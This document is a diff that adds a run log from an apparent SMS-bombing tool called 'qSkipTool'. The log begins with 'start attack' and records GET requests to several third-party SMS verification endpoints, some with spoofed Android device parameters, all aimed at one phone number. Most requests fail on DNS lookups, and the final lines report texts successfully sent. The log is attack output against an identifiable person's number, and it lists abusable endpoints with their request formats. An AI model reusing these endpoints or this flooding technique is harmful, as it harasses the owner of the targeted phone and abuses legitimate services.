@@ -1,0 +1,40 @@
+[qSkipTool]2024/02/12 15:22:41 log.go:40: 开始攻击
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://m.yaya.cn/tools/web_submit.ashx?action=reg_get_mobile_code&amp;mobile=17757488665": dial tcp: lookup m.yaya.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://m.yaya.cn/tools/web_submit.ashx?action=reg_get_mobile_code&amp;mobile=17757488665": dial tcp: lookup m.yaya.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://m.yaya.cn/tools/web_submit.ashx?action=reg_get_mobile_code&amp;mobile=17757488665": dial tcp: lookup m.yaya.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://bizapi.pezy.cn/qknode/sms/reqSmsCode?publishid=1003&amp;deviceId=2808ec7ef7fbeed6&amp;df=android&amp;vt=5&amp;screen=1080x1920&amp;deviceid=2808ec7ef7fbeed6&amp;proid=qknode&amp;os=android&amp;av=NMF26X&amp;appVersion=1.4.0&amp;imei=&amp;ov=7.1.1&amp;osVersion=7.1.1&amp;osLevel=25&amp;phone=17757488665&amp;token=": dial tcp: lookup bizapi.pezy.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://bizapi.pezy.cn/qknode/sms/reqSmsCode?df=android&amp;publishid=1003&amp;deviceId=8812baafc8de4fe4&amp;vt=5&amp;screen=720x1280&amp;deviceid=&amp;os=android&amp;proid=qknode&amp;av=MMB29M&amp;appVersion=1.6.1&amp;imei=&amp;ov=6.0.1&amp;osVersion=6.0.1&amp;deviceVersion=Redmi%204A&amp;osLevel=23&amp;phone=17757488665&amp;token=": dial tcp: lookup bizapi.pezy.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://bizapi.pezy.cn/qknode/sms/reqSmsCode?df=android&amp;publishid=1003&amp;deviceId=8812baafc8de4fe4&amp;vt=5&amp;screen=720x1280&amp;deviceid=&amp;os=android&amp;proid=qknode&amp;av=MMB29M&amp;appVersion=1.6.1&amp;imei=&amp;ov=6.0.1&amp;osVersion=6.0.1&amp;deviceVersion=Redmi 4A&amp;osLevel=23&amp;phone=17757488665": dial tcp: lookup bizapi.pezy.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://bizapi.pezy.cn/qknode/sms/reqSmsCode?df=android&amp;publishid=1003&amp;deviceId=8812baafc8de4fe4&amp;vt=5&amp;screen=720x1280&amp;deviceid=&amp;os=android&amp;proid=qknode&amp;av=MMB29M&amp;appVersion=1.6.1&amp;imei=&amp;ov=6.0.1&amp;osVersion=6.0.1&amp;deviceVersion=Redmi 4A&amp;osLevel=23&amp;phone=17757488665": dial tcp: lookup bizapi.pezy.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://bizapi.pezy.cn/qknode/sms/reqSmsCode?df=android&amp;publishid=1003&amp;deviceId=8812baafc8de4fe4&amp;vt=5&amp;screen=720x1280&amp;deviceid=&amp;os=android&amp;proid=qknode&amp;av=MMB29M&amp;appVersion=1.6.1&amp;imei=&amp;ov=6.0.1&amp;osVersion=6.0.1&amp;deviceVersion=Redmi%204A&amp;osLevel=23&amp;phone=17757488665&amp;token=": dial tcp: lookup bizapi.pezy.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://bizapi.pezy.cn/qknode/sms/reqSmsCode?df=android&amp;publishid=1003&amp;deviceId=8812baafc8de4fe4&amp;vt=5&amp;screen=720x1280&amp;deviceid=&amp;os=android&amp;proid=qknode&amp;av=MMB29M&amp;appVersion=1.6.1&amp;imei=&amp;ov=6.0.1&amp;osVersion=6.0.1&amp;deviceVersion=Redmi 4A&amp;osLevel=23&amp;phone=17757488665": dial tcp: lookup bizapi.pezy.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://bizapi.pezy.cn/qknode/sms/reqSmsCode?publishid=1003&amp;deviceId=2808ec7ef7fbeed6&amp;df=android&amp;vt=5&amp;screen=1080x1920&amp;deviceid=2808ec7ef7fbeed6&amp;proid=qknode&amp;os=android&amp;av=NMF26X&amp;appVersion=1.4.0&amp;imei=&amp;ov=7.1.1&amp;osVersion=7.1.1&amp;osLevel=25&amp;phone=17757488665&amp;token=": dial tcp: lookup bizapi.pezy.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://bizapi.pezy.cn/qknode/sms/reqSmsCode?publishid=1003&amp;deviceId=2808ec7ef7fbeed6&amp;df=android&amp;vt=5&amp;screen=1080x1920&amp;deviceid=2808ec7ef7fbeed6&amp;proid=qknode&amp;os=android&amp;av=NMF26X&amp;appVersion=1.4.0&amp;imei=&amp;ov=7.1.1&amp;osVersion=7.1.1&amp;osLevel=25&amp;phone=17757488665&amp;token=": dial tcp: lookup bizapi.pezy.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://bizapi.pezy.cn/qknode/sms/reqSmsCode?df=android&amp;publishid=1003&amp;deviceId=8812baafc8de4fe4&amp;vt=5&amp;screen=720x1280&amp;deviceid=&amp;os=android&amp;proid=qknode&amp;av=MMB29M&amp;appVersion=1.6.1&amp;imei=&amp;ov=6.0.1&amp;osVersion=6.0.1&amp;deviceVersion=Redmi%204A&amp;osLevel=23&amp;phone=17757488665&amp;token=": dial tcp: lookup bizapi.pezy.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 不知名商家 get请求失败
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://dafeiyu.cn/sms/boom?mobile=17757488665&amp;config=1&amp;num=2": dial tcp: lookup dafeiyu.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://dafeiyu.cn/sms/boom?mobile=17757488665&amp;config=1&amp;num=2": dial tcp: lookup dafeiyu.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 处理失败: Get "http://dafeiyu.cn/sms/boom?mobile=17757488665&amp;config=1&amp;num=2": dial tcp: lookup dafeiyu.cn: no such host
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 成功发送 不知名商家 短信
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 成功发送 不知名商家 短信
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 成功发送 永城至敏 短信
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 成功发送 不知名商家 短信
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 成功发送 不知名商家 短信
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 成功发送 永城至敏 短信
+[qSkipTool]2024/02/12 15:22:42 log.go:40: 成功发送 不知名商家 短信
+[qSkipTool]2024/02/12 15:22:43 log.go:40: 成功发送 不知名商家 短信
+[qSkipTool]2024/02/12 15:22:43 log.go:40: 成功发送 不知名商家 短信
